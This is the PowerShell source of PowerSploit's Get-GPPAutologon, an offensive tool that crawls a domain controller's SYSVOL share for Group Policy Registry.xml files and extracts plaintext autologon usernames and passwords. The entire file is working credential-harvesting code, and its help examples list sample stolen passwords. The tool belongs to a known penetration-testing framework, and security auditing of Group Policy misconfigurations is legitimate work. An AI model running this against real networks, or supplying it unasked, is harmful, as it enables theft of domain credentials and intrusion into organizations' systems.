function Get-GPPAutologon 
{
<#
.SYNOPSIS

    Retrieves password from Autologon entries that are pushed through Group Policy Registry Preferences.

    PowerSploit Function: Get-GPPAutologon
    Author: Oddvar Moe (@oddvarmoe)
    Based on Get-GPPPassword by Chris Campbell (@obscuresec) - Thanks for your awesome work!
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER Server

    Specifies an Active Directory server (domain controller) to bind to.
    Default's to the users current domain controller.

.PARAMETER Credential

    A [Management.Automation.PSCredential] object of alternate credentials for connection to the target domain.

.DESCRIPTION

    Get-GPPAutologon searches the domain controller for registry.xml to find autologon information and returns the username and password.

.EXAMPLE

    PS C:\> Get-GPPAutolgon
    
    UserNames              File                                         Passwords
    ---------              ----                                         ---------
    {administrator}        \\ADATUM.COM\SYSVOL\Adatum.com\Policies\{... {PasswordsAreLam3}
    {NormalUser}           \\ADATUM.COM\SYSVOL\Adatum.com\Policies\{... {ThisIsAsupaPassword}


.EXAMPLE

    PS C:\> Get-GPPAutologon | ForEach-Object {$_.passwords} | Sort-Object -Uniq
    
    password
    password12
    password123
    password1234
    password1234$
    read123
    Recycling*3ftw!

.EXAMPLE

    PS C:\> Get-GPPAutologon -Server DC01.example.domain -Credential example.domain\testuser

.LINK
    
    https://support.microsoft.com/nb-no/kb/324737
#>
    
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server = $($ENV:LOGONSERVER -replace '\\',''),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    
    #Some XML issues between versions
    Set-StrictMode -Version 2
    
    #define helper function to parse fields from xml files
    function Get-GPPInnerFields 
    {
        [CmdletBinding()]
        Param (
            $File 
        )
    
        try 
        {
            [xml] $Xml = Get-Content ($File)

            #declare empty arrays
            $Password = @()
            $UserName = @()
            
            #check for password and username field
            if (($Xml.innerxml -like "*DefaultPassword*") -and ($Xml.innerxml -like "*DefaultUserName*"))
            {
                $props = $xml.GetElementsByTagName("Properties")
                foreach($prop in $props)
                {
                    switch ($prop.name) 
                    {
                        'DefaultPassword'
                        {
                            $Password += , $prop | Select-Object -ExpandProperty Value
                        }
                    
                        'DefaultUsername'
                        {
                            $Username += , $prop | Select-Object -ExpandProperty Value
                        }
                    }
                    Write-Verbose "Potential password in $File"
                }

                #put [BLANK] in variables
                if (!($Password)) 
                {
                    $Password = '[BLANK]'
                }

                if (!($UserName))
                {
                    $UserName = '[BLANK]'
                }
                       
                #Create custom object to output results
                $ObjectProperties = @{'Passwords' = $Password;
                                      'UserNames' = $UserName;
                                      'File' = $File}
                    
                $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                Write-Verbose "The password is between {} and may be more than one value."
                if ($ResultsObject)
                {
                    Return $ResultsObject
                }
            }
        }
        catch {Write-Error $_}
    }

    try {
        $PATH="\\$Server\SYSVOL"
        # connect to domain controller
        if ($PSBoundParameters['Credential']) {
            $DRIVE = New-PSDrive -Name DC -PSProvider FileSystem -Root \\$Server\SYSVOL -Credential $Credential -Scope global
            $PATH="DC:\*"
            if( -not $DRIVE ){throw 'Could not connect to domain controller.'}
        } else {
            if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
                throw 'Machine is not a domain member or User is not a member of the domain.'
            }
        }

        #discover potential registry.xml containing autologon passwords
        Write-Host 'Searching the DC. This could take a while.'
        $XMlFiles = Get-ChildItem -Path $PATH -Recurse -ErrorAction SilentlyContinue -Include 'Registry.xml'
    
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
        foreach ($File in $XMLFiles) {
            $Result = (Get-GppInnerFields $File.Fullname)
            Write-Output $Result
        }

        if ($PSBoundParameters['Credential']) {
            Remove-PSDrive DC
        }

        Write-Host "Done."
    }

    catch {Write-Error $_}
}
